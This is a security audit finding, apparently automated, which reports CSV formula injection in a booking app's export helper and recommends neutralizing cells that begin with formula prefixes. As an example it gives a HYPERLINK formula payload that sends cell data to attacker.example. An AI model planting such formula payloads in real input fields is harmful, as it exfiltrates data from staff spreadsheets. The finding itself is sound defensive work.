# [MEDIUM] CSV export does not neutralize spreadsheet formulas

**File:** [`lib/export/csv.ts`](https://github.com/lapeninns/nabatable/blob/codex/Menu/blob/codex/lib/export/csv.ts#L6-L34) (lines 6, 14, 15, 18, 19, 33, 34)
**Project:** nabatableLP
**Severity:** MEDIUM • **Confidence:** high • **Slug:** `other-csv-formula-injection`

## Owners

**Suggested assignee:** `aman.shrestha@mail.bcu.ac.uk` _(via last-committer)_

## Finding

escapeCSVField only converts values to strings, quotes delimiter-containing fields, and escapes double quotes. It does not neutralize values beginning with spreadsheet formula prefixes such as =, +, -, @, or leading control/whitespace before those characters. generateCSV applies this helper directly to exported row data. Tracing callers shows ops bookings and customer exports include guest-controlled fields such as booking customer_name, notes, and customer records populated from public booking input. A guest can create a booking with a name like =HYPERLINK("https://attacker.example/?x="&A1,"click"); when staff export and open the CSV in Excel, LibreOffice, or similar spreadsheet software, the value may be interpreted as a formula, enabling external requests or spreadsheet-context data exfiltration/social engineering.

## Recommendation

Before CSV quoting, normalize every exported cell as literal text. Prefix cells whose first non-whitespace/control character is =, +, -, or @ with a single quote or another accepted neutralizing character, then perform delimiter/quote escaping. Add tests for both delimiter-free and quoted formula payloads.

## Recent committers (`git log`)

- amanshresthaa <aman.shrestha@mail.bcu.ac.uk> (2025-10-11)
